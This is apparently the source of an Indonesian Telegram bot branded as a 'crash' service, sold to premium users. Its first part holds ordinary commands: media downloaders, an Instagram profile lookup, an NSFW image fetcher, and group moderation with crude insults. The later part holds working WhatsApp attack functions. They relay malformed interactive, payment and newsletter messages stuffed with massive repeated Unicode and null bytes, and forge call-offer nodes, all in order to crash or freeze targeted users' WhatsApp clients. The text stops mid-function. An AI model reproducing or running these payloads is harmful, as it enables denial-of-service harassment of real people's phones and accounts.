bot.onText(/\/getcode (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const randomImage = getRandomImage();
    const userId = msg.from.id;

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
            //cek prem //
if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>#FIVETYWIN CRASH  ⚘</blockquote>
Oi kontol kalo mau akses comandd ini,
/addprem dulu bego 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "t.me/FIVETYWIN" }], 
      ]
    }
  });
}
  const url = (match[1] || "").trim();
  if (!/^https?:\/\//i.test(url)) {
    return bot.sendMessage(chatId, "♥️ /getcode https://namaweb");
  }

  try {
    const response = await axios.get(url, {
      responseType: "text",
      headers: { "User-Agent": "Mozilla/5.0 (compatible; Bot/1.0)" },
      timeout: 20000
    });
    const htmlContent = response.data;

    const filePath = path.join(__dirname, "web_source.html");
    fs.writeFileSync(filePath, htmlContent, "utf-8");

    await bot.sendDocument(chatId, filePath, {
      caption: `✅ CODE DARI ${url}`
    });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "♥️🥹 ERROR SAAT MENGAMBIL CODE WEB");
  }
});

bot.onText(/\/panelinfo/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  // Daftar ID owner dari config.js
  const ownerIds = config.OWNER_ID || [];

  // Cek apakah user adalah owner
  if (!ownerIds.includes(String(userId))) {
    return bot.sendMessage(chatId, "❌ Hanya owner yang bisa melihat informasi panel ini!");
  }

  // Jika owner, tampilkan info sistem
  const os = require("os");
  const axios = require("axios");

  const hostname = os.hostname();
  const platform = os.platform();
  const arch = os.arch();
  const cpuModel = os.cpus()[0].model;
  const cpuCore = os.cpus().length;
  const totalMem = Math.round(os.totalmem() / 1024 / 1024);
  const uptimeOs = Math.floor(os.uptime() / 3600);
  const now = new Date().toLocaleString("id-ID");

  // Ambil IP publik
  let ip = "Tidak terdeteksi";
  try {
    const res = await axios.get("https://api.ipify.org?format=json");
    ip = res.data.ip;
  } catch (e) {
    ip = "Tidak terhubung ke internet";
  }

  const text = `
💻 <blockquote>PANEL INFORMATION<blockquote>
━━━━━━━━━━━━━━━━━━
🖥️ <b>Hostname:</b> ${hostname}
🧠 <b>CPU:</b> ${cpuModel} (${cpuCore} Core)
💾 <b>Total RAM:</b> ${totalMem} MB
⚙️ <b>OS:</b> ${platform.toUpperCase()} (${arch})
📡 <b>Public IP:</b> ${ip}
⏱️ <b>Uptime Server:</b> ${uptimeOs} jam
📅 <b>Waktu:</b> ${now}
━━━━━━━━━━━━━━━━━━
<blockquote>Data real-time dari panel host kamu.<blockquote>
`;

  await bot.sendMessage(chatId, text, { parse_mode: "HTML" });
});

bot.onText(/\/chat (.+)/, (msg, match) => {
    const messageText = match[1]; 
    sendNotifOwner(msg, `Pesan dari pengguna: ${messageText}`)
      .then(() => {
        bot.sendMessage(msg.chat.id, 'pesan anda telah di kirim ke Pipop tunggu ya');
      })
      .catch(() => {
        bot.sendMessage(msg.chat.id, 'terjadi kesalahan saat mengirim pesan.');
      });
});

bot.onText(/^\/brat(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const argsRaw = match[1];

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  if (!argsRaw) {
    return bot.sendMessage(chatId, 'Gunakan: /brat <teks> [--gif] [--delay=500]');
  }

  try {
    const args = argsRaw.split(' ');

    const textParts = [];
    let isAnimated = false;
    let delay = 500;

    for (let arg of args) {
      if (arg === '--gif') isAnimated = true;
      else if (arg.startsWith('--delay=')) {
        const val = parseInt(arg.split('=')[1]);
        if (!isNaN(val)) delay = val;
      } else {
        textParts.push(arg);
      }
    }

    const text = textParts.join(' ');
    if (!text) {
      return bot.sendMessage(chatId, 'Teks tidak boleh kosong!');
    }

    // Validasi delay
    if (isAnimated && (delay < 100 || delay > 1500)) {
      return bot.sendMessage(chatId, 'Delay harus antara 100–1500 ms.');
    }

    await bot.sendMessage(chatId, '🌿 Generating stiker brat...');

    const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;
    const response = await axios.get(apiUrl, {
      responseType: 'arraybuffer',
    });

    const buffer = Buffer.from(response.data);

    // Kirim sticker (bot API auto-detects WebP/GIF)
    await bot.sendSticker(chatId, buffer);
  } catch (error) {
    console.error('❌ Error brat:', error.message);
    bot.sendMessage(chatId, 'Gagal membuat stiker brat. Coba lagi nanti ya!');
  }
});

bot.onText(/^\/iqc (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  if (!text) {
    return bot.sendMessage(
      chatId,
      "⚠ Gunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|YT: maklu`",
      { parse_mode: "Markdown" }
    );
  }

  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return bot.sendMessage(
      chatId,
      "⚠ Format salah!\nGunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|maklu`",
      { parse_mode: "Markdown" }
    );
  }

  bot.sendMessage(chatId, "⏳ Tunggu sebentar...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return bot.sendMessage(chatId, "❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await bot.sendPhoto(chatId, buffer, {
      caption: `✅ Nih hasilnya`,
      parse_mode: "Markdown",
    });
  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menghubungi API.");
  }
});

bot.onText(/\/ig(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide an Instagram post/reel URL.\n\nExample:\n/ig https://www.instagram.com/reel/xxxxxx/");
    }

    const url = match[1].trim();

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/download/instagram?url=${encodeURIComponent(url)}`;

        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result) {
            return bot.sendMessage(chatId, "❌ Failed to fetch Instagram media. Please check the URL.");
        }

        // Jika ada video
        if (data.result.video) {
            await bot.sendVideo(chatId, data.result.video, {
                caption: `📸 Instagram Media\n\n👤 Author: ${data.result.username || "-"}`
            });
        } 
        // Jika hanya gambar
        else if (data.result.image) {
            await bot.sendPhoto(chatId, data.result.image, {
                caption: `📸 Instagram Media\n\n👤 Author: ${data.result.username || "-"}`
            });
        } 
        else {
            bot.sendMessage(chatId, "❌ Unsupported media type from Instagram.");
        }
    } catch (err) {
        console.error("Instagram API Error:", err);
        bot.sendMessage(chatId, "❌ Error fetching Instagram media. Please try again later.");
    }
});

bot.onText(/\/nfsw/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const name = msg.from.first_name;

  try {
    const res = await fetch("https://api.waifu.pics/nsfw/waifu");
    const json = await res.json();
    const imageUrl = json.url;

    await bot.sendPhoto(chatId, imageUrl, {
      caption: `🔞 *NSFW Waifu Request*\n\n• Permintaan oleh: [${name}](tg://user?id=${userId})\n• Source: waifu.pics\n\n_Awas panas! Ini waifu versi dewasa 😈_`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "next waifu", callback_data: "waifu18_next" },
            { text: "about dev", url: "t.me/FIVETYWIN" }
          ],
          [
            { text: "closed", callback_data: "close" }
          ]
        ]
      }
    });
  } catch (err) {
    await bot.sendMessage(chatId, "❌ Gagal memuat waifu. Coba lagi nanti.");
  }
});

bot.on("callback_query", async (callbackQuery) => {
  const data = callbackQuery.data;
  const msg = callbackQuery.message;

  if (data === "waifu18_next") {
    try {
      const res = await fetch("https://api.waifu.pics/nsfw/waifu");
      const json = await res.json();
      const imageUrl = json.url;

      await bot.editMessageMedia(
        {
          type: "photo",
          media: imageUrl,
          caption: `🔞 *NSFW NIH LU SANGE?*\n\n_PASTI NGOCOK_ 😈`,
          parse_mode: "Markdown"
        },
        {
          chat_id: msg.chat.id,
          message_id: msg.message_id,
          reply_markup: {
            inline_keyboard: [
              [
                { text: "next waifu", callback_data: "waifu18_next" },
                { text: "about dev", url: "t.me/FIVETYWIN" }
              ],
              [
                { text: "closed", callback_data: "close" }
              ]
            ]
          }
        }
      );
    } catch (err) {
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "⚠️ Gagal ambil waifu baru!",
        show_alert: true
      });
    }
  }

  if (data === "close") {
    bot.deleteMessage(msg.chat.id, msg.message_id);
  }
});

bot.onText(/^\/mute$/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    // Harus reply pesan
    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, '❌ balas pesan pengguna yang ingin di-mute.');
    }

    const targetUser = msg.reply_to_message.from;

    try {
        // Cek apakah yang memanggil adalah admin
        const admins = await bot.getChatAdministrators(chatId);
        const isAdmin = admins.some(admin => admin.user.id === fromId);
        if (!isAdmin) {
            return bot.sendMessage(chatId, '❌ hanya admin yang bisa menggunakan perintah ini.');
        }

        // Mute user: hanya non-admin yang bisa dimute
        await bot.restrictChatMember(chatId, targetUser.id, {
            permissions: {
                can_send_messages: false,
                can_send_media_messages: false,
                can_send_polls: false,
                can_send_other_messages: false,
                can_add_web_page_previews: false,
                can_change_info: false,
                can_invite_users: false,
                can_pin_messages: false
            }
        });

        // Notifikasi ke grup
        await bot.sendMessage(chatId,
            `✅ si kontol [${targetUser.first_name}](tg://user?id=${targetUser.id}) telah di mute😹.`,
            { parse_mode: 'Markdown' });

        // Balas pesan yang dimute
        await bot.sendMessage(chatId,
            '🚫 *pengguna anj telah di mute di grup ini oleh admin.*',
            {
                parse_mode: 'Markdown',
                reply_to_message_id: msg.reply_to_message.message_id
            });

    } catch (err) {
        console.error('❌ Error saat mute:', err);
        bot.sendMessage(chatId, '❌ Gagal melakukan mute.');
    }
});

bot.onText(/^\/unmute$/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    // Harus membalas pesan
    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, '❌ balas pesan pengguna yang ingin di-unmute.');
    }

    const targetUser = msg.reply_to_message.from;

    try {
        // Cek apakah pengirim adalah admin
        const admins = await bot.getChatAdministrators(chatId);
        const isAdmin = admins.some(admin => admin.user.id === fromId);
        if (!isAdmin) {
            return bot.sendMessage(chatId, '❌ hanya admin yang bisa menggunakan perintah ini.');
        }

        // Unmute pengguna
        await bot.restrictChatMember(chatId, targetUser.id, {
            permissions: {
                can_send_messages: true,
                can_send_media_messages: true,
                can_send_polls: true,
                can_send_other_messages: true,
                can_add_web_page_previews: true,
                can_invite_users: true,
                can_pin_messages: false,  // Bisa disesuaikan
                can_change_info: false    // Bisa disesuaikan
            }
        });

        // Notifikasi ke grup
        await bot.sendMessage(chatId,
            `✅ si baby [${targetUser.first_name}](tg://user?id=${targetUser.id}) telah di unmute🤓.`,
            { parse_mode: 'Markdown' });

        // Balas ke pesan pengguna
        await bot.sendMessage(chatId,
            '🔊 *pengguna telah di-unmute di grup ini, silakan mengobrol kembali.*',
            {
                parse_mode: 'Markdown',
                reply_to_message_id: msg.reply_to_message.message_id
            });

    } catch (err) {
        console.error('❌ Error saat unmute:', err);
        bot.sendMessage(chatId, '❌ Gagal melakukan unmute.');
    }
});

bot.onText(/^\/ban$/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    // Harus membalas pesan
    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, '❌ Balas pesan pengguna yang ingin di-ban.');
    }

    const targetUser = msg.reply_to_message.from;

    try {
        // Cek apakah pengirim adalah admin
        const admins = await bot.getChatAdministrators(chatId);
        const isAdmin = admins.some(admin => admin.user.id === fromId);
        if (!isAdmin) {
            return bot.sendMessage(chatId, '❌ Hanya admin yang bisa menggunakan perintah ini.');
        }

        // Ban pengguna
        await bot.banChatMember(chatId, targetUser.id);

        // Notifikasi ke grup
        await bot.sendMessage(chatId,
            `✅ Pengguna [${targetUser.first_name}](tg://user?id=${targetUser.id}) telah di-ban.`,
            { parse_mode: 'Markdown' });

        // Pesan follow-up di bawah reply
        await bot.sendMessage(chatId,
            '🚫 *Pengguna telah di-ban dari grup ini oleh admin.*',
            {
                parse_mode: 'Markdown',
                reply_to_message_id: msg.reply_to_message.message_id
            });

    } catch (err) {
        console.error('❌ Error saat ban:', err);
        bot.sendMessage(chatId, '❌ Gagal melakukan ban.');
    }
});

bot.onText(/^\/unban$/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    // Harus membalas pesan
    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, '❌ Balas pesan pengguna yang ingin di-unban.');
    }

    const targetUser = msg.reply_to_message.from;

    try {
        // Cek apakah pengirim adalah admin
        const admins = await bot.getChatAdministrators(chatId);
        const isAdmin = admins.some(admin => admin.user.id === fromId);
        if (!isAdmin) {
            return bot.sendMessage(chatId, '❌ Hanya admin yang bisa menggunakan perintah ini.');
        }

        // Unban pengguna
        await bot.unbanChatMember(chatId, targetUser.id, {
            only_if_banned: true
        });

        // Notifikasi ke grup
        await bot.sendMessage(chatId,
            `✅ Pengguna [${targetUser.first_name}](tg://user?id=${targetUser.id}) telah di-unban.`,
            { parse_mode: 'Markdown' });

        // Pesan tambahan
        await bot.sendMessage(chatId,
            '🔓 *Pengguna telah di-unban dari grup ini, silakan bergabung kembali.*',
            {
                parse_mode: 'Markdown',
                reply_to_message_id: msg.reply_to_message.message_id
            });

    } catch (err) {
        console.error('❌ Error saat unban:', err);
        bot.sendMessage(chatId, '❌ Gagal melakukan unban.');
    }
});

bot.onText(/^\/kick$/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    // Harus membalas pesan
    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, '❌ Balas pesan pengguna yang ingin di-kick.');
    }

    const targetUser = msg.reply_to_message.from;

    try {
        // Cek apakah pengirim adalah admin
        const admins = await bot.getChatAdministrators(chatId);
        const isAdmin = admins.some(admin => admin.user.id === fromId);
        if (!isAdmin) {
            return bot.sendMessage(chatId, '❌ Hanya admin yang bisa menggunakan perintah ini.');
        }

        // Kick: ban lalu unban agar bisa join lagi
        await bot.banChatMember(chatId, targetUser.id);
        await bot.unbanChatMember(chatId, targetUser.id);

        // Notifikasi ke grup
        await bot.sendMessage(chatId,
            `✅ Pengguna [${targetUser.first_name}](tg://user?id=${targetUser.id}) telah di-kick.`,
            { parse_mode: 'Markdown' });

        // Pesan tambahan sebagai reply
        await bot.sendMessage(chatId,
            '👢 *Pengguna telah di-kick dari grup ini oleh admin. Pengguna dapat bergabung kembali jika diperbolehkan.*',
            {
                parse_mode: 'Markdown',
                reply_to_message_id: msg.reply_to_message.message_id
            });

    } catch (err) {
        console.error('❌ Error saat kick:', err);
        bot.sendMessage(chatId, '❌ Gagal melakukan kick.');
    }
});

bot.onText(/^\/(ai|openai)(\s+.+)?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[2]?.trim();

  if (!text) {
    return bot.sendMessage(chatId, 'Contoh: /ai siapa presiden indonesia');
  }

  await bot.sendMessage(chatId, 'Tunggu sebentar...');

  try {
    const res = await fetch(`https://fastrestapis.fasturl.cloud/aillm/gpt-4o-turbo?ask=${encodeURIComponent(text)}`);
    const data = await res.json();

    if (!data.status) {
      return bot.sendMessage(chatId, JSON.stringify(data, null, 2));
    }

    const replyText = `*© AI - Asistent New Latest*\n\n${data.result}`;
    await bot.sendMessage(chatId, replyText, { parse_mode: 'Markdown' });
  } catch (err) {
    console.error("AI Command Error:", err);
    bot.sendMessage(chatId, 'Terjadi kesalahan saat menghubungi AI.');
  }
});

bot.onText(/^\/instagramstalk(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];

  if (!input) {
    return bot.sendMessage(chatId, '❌ Kirim username Instagram setelah command, contoh:\n/instagramstalk google');
  }

  try {
    const response = await axios.post('https://api.siputzx.my.id/api/stalk/instagram', {
      username: input
    }, {
      headers: {
        'Content-Type': 'application/json',
        'Accept': '*/*'
      }
    });

    const data = response.data;
    if (!data.status) {
      return bot.sendMessage(chatId, '❌ Data tidak ditemukan atau username salah.');
    }

    const ig = data.data;

    const msgText = `
📸 *Instagram Profile Info*

👤 Username: ${ig.username}
👑 Full Name: ${ig.full_name}
📝 Biography: ${ig.biography || '-'}
🔗 External URL: ${ig.external_url || '-'}
📊 Followers: ${ig.followers_count.toLocaleString()}
👥 Following: ${ig.following_count.toLocaleString()}
📬 Posts: ${ig.posts_count.toLocaleString()}
🔒 Private: ${ig.is_private ? 'Yes' : 'No'}
✔️ Verified: ${ig.is_verified ? 'Yes' : 'No'}
🏢 Business Account: ${ig.is_business_account ? 'Yes' : 'No'}
`.trim();

    await bot.sendPhoto(chatId, ig.profile_pic_url, {
      caption: msgText,
      parse_mode: 'Markdown'
    });
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, '❌ Terjadi kesalahan saat mengambil data Instagram.');
  }
});



// ----------- ( START FUNCTION ) ----------------------\\
async function stxcm(sock, target) {
    try {
        const interactivePayload = {
            interactiveMessage: {
                header: {
                    hasMediaAttachment: true,
                    jpegThumbnail: null
                },
                contextInfo: {
                    participant: "0@s.whatsapp.net",
                    remoteJid: "status@broadcast",
                    conversionSource: "porn",
                    conversionData: crypto.randomBytes(16),
                    conversionDelaySeconds: 9999,
                    forwardingScore: 999999,
                    isForwarded: true,
                    quotedAd: {
                        advertiserName: "StX-Revolution 👾",
                        mediaType: "IMAGE",
                        jpegThumbnail: null,
                        caption: "SOLO EXPOSED"
                    },
                    placeholderKey: {
                        remoteJid: "0@s.whatsapp.net",
                        fromMe: false,
                        id: "ABCDEF1234567890"
                    },
                    expiration: -99999,
                    ephemeralSettingTimestamp: Date.now(),
                    ephemeralSharedSecret: crypto.randomBytes(16),
                    entryPointConversionSource: "WhatsaApp",
                    entryPointConversionApp: "WhatsApp",
                    actionLink: {
                        url: "t.me/FIVETYWIN",
                        buttonTitle: "action_button"
                    },
                    disappearingMode: {
                        initiator: 1,
                        trigger: 2,
                        initiatorDeviceJid: target,
                        initiatedByMe: true
                    },
                    groupSubject: "𝑸𝒖𝒊 kwpride",
                    parentGroupJid: "120363370626418572@g.us",
                    trustBannerType: "X",
                    trustBannerAction: 99999,
                    isSampled: true,
                    externalAdReply: {
                        title: "𒑡 𝒆́kwpridey 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧᭾៚",
                        mediaType: 2,
                        renderLargerThumbnail: false,
                        showAdAttribution: false,
                        containsAutoReply: false,
                        body: "© S-3Xecution",
                        thumbnail: null,
                        sourceUrl: "t.me/FIVETYWIN",
                        sourceId: "9T7A4M1A",
                        ctwaClid: "ctwaClid",
                        ref: "ref",
                        clickToWhatsappCall: true,
                        ctaPayload: "ctaPayload",
                        disableNudge: true,
                        originalImageUrl: null
                    },
                    featureEligibilities: {
                        cannotBeReactedTo: true,
                        cannotBeRanked: true,
                        canRequestFeedback: true
                    },
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "120363321780343299@newsletter",
                        serverMessageId: 1,
                        newsletterName: `Crash Sletter ~ ${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
                        contentType: 3,
                        accessibilityText: "Stx - Exposed"
                    },
                    statusAttributionType: 2,
                    utm: {
                        utmSource: "XsSource",
                        utmCampaign: "XsCampaign"
                    }
                },
                body: {
                    text: "𒑡 𝒆́rid 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧᭾៚"
                },
                nativeFlowMessage: {
                    buttons: [{
                        name: "payment_method",
                        buttonParamsJson: `{}`
                    }]
                }
            }
        };

        const msg1 = generateWAMessageFromContent(target, interactivePayload, {});
        await sock.relayMessage(target, msg1.message, { messageId: msg1.key.id });

        const paymentPayload = {
            requestPaymentMessage: {
                currencyCodeIso4217: 'USD',
                requestFrom: target,
                expiryTimestamp: null,
                contextInfo: {
                    remoteJid: " S ",
                    isForwarded: true,
                    forwardingScore: 979,
                    externalAdReply: {
                        title: "🩸⃟⃨〫⃰‣ ⁖—ridཀ͜͡ 𝐌͢Θ𝐃𝐃͢Σ𝐑𝐒 ‣—",
                        body: "ridz fivet",
                        mediaType: "VIDEO",
                        renderLargerThumbnail: true,
                        previewType: "VIDEO",
                        sourceUrl: "t.me/FIVETYWIN",
                        mediaUrl: "t.me/FIVETYWIN",
                        showAdAttribution: true,
                    }
                }
            }
        };

        await sock.relayMessage(target, paymentPayload, {
            participant: { jid: target },
            quoted: null,
            userJid: null,
            messageId: null
        });

        console.log(`Berhasil mengirim bug ke ${target}`);
        
    } catch (err) {
        console.error("Gagal mengirim pesan:", err);
    }
}



async function stxcm2(sock, target) {
  try {
    const jid = String(target).includes("@s.whatsapp.net")
      ? String(target)
      : `${String(target).replace(/\D/g, "")}@s.whatsapp.net`;

    const mapper = () => {
      let map = {};
      return {
        tx(key, fn) {
          map[key] ??= { task: Promise.resolve() };
          map[key].task = (async (prev) => {
            try {
              await prev;
            } catch {}
            return fn();
          })(map[key].task);
          return map[key].task;
        }
      };
    };

    const lolcat = mapper();

    const baffer = (buf) =>
      Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);

    const enc = encodeSignedDeviceIdentity;

    sock.createParticipantNodes = async (
      recipientJids,
      message,
      extraAttrs,
      dsmMessage
    ) => {
      if (!recipientJids.length) {
        return { nodes: [], shouldIncludeDeviceIdentity: false };
      }

      const patched =
        (await sock.patchMessageBeforeSending?.(
          message,
          recipientJids
        )) ?? message;

      const stain = Array.isArray(patched)
        ? patched
        : recipientJids.map((recipie) => ({
            recipientJid: recipie,
            message: patched
          }));

      const { id: meId, lid: meLid } = sock.authState.creds.me;
      const attx = meLid ? jidDecode(meLid)?.user : null;

      let shouldIncludeDeviceIdentity = false;

      const nodes = await Promise.all(
        stain.map(async ({ recipientJid: recipie, message: msg }) => {
          const { user: targetUser } = jidDecode(recipie);
          const { user: ownUser } = jidDecode(meId);

          const isOwn =
            targetUser === ownUser || targetUser === attx;

          const pient = recipie === meId || recipie === meLid;
          if (dsmMessage && isOwn && !pient) msg = dsmMessage;

          const bite = baffer(
            enc ? enc(msg) : Buffer.from([])
          );

          return lolcat.tx(recipie, async () => {
            const { type, ciphertext } =
              await sock.signalRepository.encryptMessage({
                jid: recipie,
                data: bite
              });

            if (type === "pkmsg") {
              shouldIncludeDeviceIdentity = true;
            }

            return {
              tag: "to",
              attrs: { jid: recipie },
              content: [
                {
                  tag: "enc",
                  attrs: { v: "2", type, ...extraAttrs },
                  content: ciphertext
                }
              ]
            };
          });
        })
      );

      return {
        nodes: nodes.filter(Boolean),
        shouldIncludeDeviceIdentity
      };
    };

    let devices = [];

    try {
      devices = (
        await sock.getUSyncDevices([jid], false, false)
      ).map(({ user, device }) =>
        `${user}${device ? ":" + device : ""}@s.whatsapp.net`
      );
    } catch {
      devices = [jid];
    }

    try {
      await sock.assertSessions(devices);
    } catch {}

    let vict = [];
    let shouldIncludeDeviceIdentity = false;

    try {
      const created = await sock.createParticipantNodes(
        devices,
        { conversation: "y" },
        { count: "0" }
      );

      vict = created?.nodes ?? [];
      shouldIncludeDeviceIdentity =
        !!created?.shouldIncludeDeviceIdentity;
    } catch {}

    const main = {
      tag: "call",
      attrs: {
        to: jid,
        id:
          sock.generateMessageTag?.() ??
          crypto.randomBytes(8).toString("hex"),
        from:
          sock.user?.id ||
          sock.authState?.creds?.me?.id
      },
      content: [
        {
          tag: "offer",
          attrs: {
            "call-id": crypto
              .randomBytes(16)
              .toString("hex")
              .slice(0, 64)
              .toUpperCase(),
            "call-creator":
              sock.user?.id ||
              sock.authState?.creds?.me?.id
          },
          content: [
            { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
            { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
            {
              tag: "video",
              attrs: {
                orientation: "0",
                screen_width: "1920",
                screen_height: "1080",
                device_orientation: "0",
                enc: "vp8",
                dec: "vp8"
              }
            },
            { tag: "net", attrs: { medium: "3" } },
            {
              tag: "capability",
              attrs: { ver: "1" },
              content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
            },
            { tag: "encopt", attrs: { keygen: "2" } },
            {
              tag: "destination",
              attrs: {},
              content: vict
            }
          ]
        }
      ]
    };

    if (shouldIncludeDeviceIdentity && encodeSignedDeviceIdentity) {
      try {
        const deviceIdentity = encodeSignedDeviceIdentity(
          sock.authState.creds.account,
          true
        );

        main.content[0].content.push({
          tag: "device-identity",
          attrs: {},
          content: deviceIdentity
        });
      } catch {}
    }

    await sock.relayMessage(
      target,
      {
        requestPaymentMessage: {
          currencyCodeIso4217: "USD",
          requestFrom: target,
          expiryTimestamp: null,
          contextInfo: {
            remoteJid: " S ",
            isForwarded: true,
            forwardingScore: 9999,
            externalAdReply: {
              title: " S ",
              body: " S ",
              mediaType: "VIDEO",
              renderLargerThumbnail: true,
              previewTtpe: "VIDEO",
              sourceUrl: "t.me/FIVETYWIN",
              mediaUrl: "t.me/FIVETYWIN",
              showAdAttribution: true
            }
          }
        }
      },
      {
        participant: { jid: target },
        quoted: null,
        userJid: null,
        messageId: null
      }
    );

    await sock.sendNode(main);
  } catch {}
}


async function XProtexBlankChatV3(target) {
  const XProtex = '_*~@2~*_\n'.repeat(10500);
  const Private = 'ោ៝'.repeat(10000);
   
  const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "1@newsletter",
      newsletterName: "𝙓𝙋𝙧𝙤𝙩𝙚𝙭𝙂𝙡𝙤𝙬" + "ោ៝".repeat(20000),
      caption: "𝙓𝙋𝙧𝙤𝙩𝙚𝙭𝙂𝙡𝙤𝙬" + Private + "ោ៝".repeat(20000),
      inviteExpiration: "999999999",
    },
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null,
  });

  const messageCrash2 = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
              contextInfo: {
              stanzaId: sock.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "𝙓𝙋𝙧𝙤𝙩𝙚𝙭𝙂𝙡𝙤𝙬",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: ""
                    },
                },
              },
            body: {
              text: "Hi I'm XProtex!!" + "ꦾ".repeat(2000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_url",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_reminder",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "cta_cancel_reminder",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "address_message",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "send_location",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(1000),
                },
              ],
            },
          },
        },
      },
    };
    await sock.relayMessage(target, messageCrash2, {
      participant: { jid: target },
    });

